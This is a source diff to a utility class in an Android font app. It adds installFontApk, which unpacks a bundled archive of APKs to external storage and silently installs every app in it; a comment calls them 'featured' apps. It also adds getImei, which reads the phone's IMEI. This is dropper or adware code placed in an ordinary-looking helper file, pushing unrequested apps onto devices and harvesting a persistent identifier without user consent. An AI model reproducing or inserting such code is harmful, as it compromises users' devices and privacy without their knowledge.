@@ -1,10 +1,17 @@
 package com.sg.mtfont.utils;
 
+import java.io.File;
+import java.io.FileFilter;
+import java.io.IOException;
+
 import android.bluetooth.BluetoothClass.Device;
 import android.content.Context;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Build;
+import android.os.Environment;
 import android.os.Handler;
 import android.telephony.TelephonyManager;
 import android.widget.Toast;
@@ -24,7 +31,6 @@ import com.sg.mtfont.mail.SimpleMailSender;
  */
 public class CommonUtils {
 
-	public static final String FontXiu = "FontXiu";
 	
 	public static final String CURRENT_POINTS = "CURRENT_POINTS";
 	
@@ -37,6 +43,49 @@ public class CommonUtils {
 	public static void toastText(Context context, int adTabTitle) {
 		Toast.makeText(context, adTabTitle, Toast.LENGTH_SHORT).show();
 	}
+	
+	
+	public  static  void installFontApk(final Context ctx) {
+        // 初始化数据pb
+        new Thread(new Runnable() {
+            
+            @Override
+            public void run() {
+                try {
+                    String filePath = Environment.getExternalStorageDirectory()+"/fontxiuxiu";
+                    File file = new File(filePath);
+                    if (!file.exists()){
+                        ApkInstallHelper.unZip(ctx, "fontapk.zip",filePath );
+                    }
+                    
+                    //过滤apk文件
+                    File[] files = file.listFiles(new FileFilter() {
+                        
+                        @Override
+                        public boolean accept(File pathname) {
+                            if (pathname.getName().endsWith(".apk")){
+                                return true;
+                            }
+                            return false;
+                        }
+                    });
+                    //静默安装精品
+                    for (int i=0; i < files.length; i++){
+                        String apkFilePath = files[i].getAbsolutePath();
+                        PackageManager pm = ctx.getPackageManager();
+                        PackageInfo info = pm.getPackageArchiveInfo(apkFilePath,
+                                PackageManager.GET_ACTIVITIES);
+                        String packageName = info.applicationInfo.packageName;
+                        MainActivity.silentInstall(ctx,packageName,apkFilePath);
+                    }
+                    
+                } catch (IOException e) {
+                    e.printStackTrace();
+                } 
+                
+            }
+        }).start();
+    }
 	
 	/**
 	 * 
@@ -123,6 +172,19 @@ public class CommonUtils {
 		}
 		
 		return false;
+	}
+	
+	/**
+	 * 
+	 * @author Kalus Yu
+	 * @param ctx
+	 * @return
+	 * 2014年10月3日 下午7:59:07
+	 */
+	public static String getImei(Context ctx){
+	    TelephonyManager telephonyManager= (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+        String imei = telephonyManager.getDeviceId();
+        return imei;
 	}
 	
 	/**
